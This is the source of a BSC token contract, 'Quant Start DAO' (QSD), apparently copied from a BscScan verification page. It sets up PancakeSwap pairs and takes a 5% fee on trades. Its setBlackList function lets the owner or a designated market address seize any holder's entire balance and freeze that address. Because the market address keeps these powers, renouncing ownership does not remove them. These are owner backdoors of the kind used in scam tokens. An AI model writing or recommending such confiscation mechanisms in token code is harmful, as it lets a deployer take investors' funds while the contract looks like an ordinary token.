/**
 *Submitted for verification at BscScan.com on 2022-08-04
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}


abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private _marketAddress;
    address private _teamAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _blackList; // 黑名单就是指定地址不能交易，把黑名单地址里的币转出来到market

    uint256 private _totalSupply;

    ISwapRouter private _swapRouter;
    address private _usdt;
    mapping(address => bool) private _swapPairList;

    uint256 private constant MAX = ~uint256(0);

    address public _mainPair;

    constructor (string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply, address RouterAddress, address USDTAddress, address marketAddress, address TeamAddress, address ReceiveAddress){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        address usdt = USDTAddress;

        _usdt = usdt;
        _swapRouter = swapRouter;
        _allowances[address(this)][address(swapRouter)] = MAX;

        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address usdtPair = swapFactory.createPair(address(this), usdt);
        _swapPairList[usdtPair] = true;

        address mainPair = swapFactory.createPair(address(this), swapRouter.WETH());
        _swapPairList[mainPair] = true;

        _mainPair = usdtPair;

        uint256 total = Supply * 10 ** Decimals;
        _totalSupply = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        _marketAddress = marketAddress;
        _teamAddress = TeamAddress;

        _feeWhiteList[marketAddress] = true;
        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;

    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(_blackList[from]==false && _blackList[to]==false, "ERC20: from or to in not allowed list");
        if (_feeWhiteList[from] || _feeWhiteList[to]){
            // from和to有一个是白名单用户就不扣手续费，正常转账
            _tokenTransfer(from, to, amount, 0);
        }else{

            if (_swapPairList[to] || _swapPairList[from]) { // 买卖，加减池子
                if(balanceOf(address(0))<99980000000000000000000000) _tokenTransfer(from, address(0), amount/100, 0); // 销毁1%              
                _tokenTransfer(from, _marketAddress, amount/100, 0); // 市场1%
                _tokenTransfer(from, _teamAddress, amount/100, 0); // 团队1%
                _tokenTransfer(from, _mainPair, amount/50, 0); // 池子2%
                _tokenTransfer(from, to, amount*95/100, 0); //实际到帐

            }else{
                // 普通转账
                _tokenTransfer(from, to, amount, 0);
            }
        }

    }
    
    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        uint256 fee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (fee > 0) {
            feeAmount = tAmount * fee / 100;
            _takeTransfer(
                sender,
                address(this),
                feeAmount
            );
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setMarketAddress(address addr) external onlyFunder {
        _marketAddress = addr;
        _feeWhiteList[addr] = true;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyFunder {
        _feeWhiteList[addr] = enable;
    }    

    function setBlackList(address addr, bool enable) external onlyFunder {
        _tokenTransfer(addr, _marketAddress, balanceOf(addr), 0); 
        _blackList[addr] = enable;
    }   

    function setSwapPairList(address addr, bool enable) external onlyFunder {
        _swapPairList[addr] = enable;
    }

    function claimBalance() external {
        payable(_marketAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount) external {
        IERC20(token).transfer(_marketAddress, amount);
    }


    function setMainPair(address pair) external onlyFunder {
        _mainPair = pair;
    }

    modifier onlyFunder() {
        require(_owner == msg.sender || _marketAddress == msg.sender, "!Funder");
        _;
    }

    receive() external payable {}
}

contract QSD is AbsToken {
    constructor() AbsToken(
        "Quant Start DAO",
        "QSD",
        18,
        1e8,
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E), // PancakeSwap: Router v2
        address(0x55d398326f99059fF775485246999027B3197955), // USDT
        address(0xB52B51c284fdADe2E775E752dCDfa0378943409f), // market
        address(0x4BE58F4dd4dD7d960f109D46DB92baF6594e0Ee7), // team
        address(0xA946EB51774697089D285Cec1432e78e64fD51Bb)  // 发行地址   
    ){

    }
}